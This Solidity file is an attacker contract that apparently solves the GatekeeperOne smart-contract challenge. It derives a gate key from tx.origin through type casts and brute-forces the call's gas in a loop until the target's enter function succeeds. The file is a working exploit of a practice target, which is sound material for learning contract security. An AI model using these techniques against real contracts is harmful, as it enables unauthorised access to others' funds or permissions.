// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperOne} from "./GatekeeperOne.sol";

contract GatekeeperOneAttacker {
    function attack(GatekeeperOne target) public {
        bytes8 key = bytes8(uint64(uint16(uint160(tx.origin))) + 2 ** 32);

        bytes memory params = abi.encodeCall(target.enter, (key));

        bool ok = false;

        for (uint256 i = 0; i < 120; i++) {
            (ok,) = address(target).call{gas: i + 150 + (8191 * 3)}(params);
            if (ok) {
                break;
            }
        }
        require(ok, "Attack did not succeeed");
    }
}
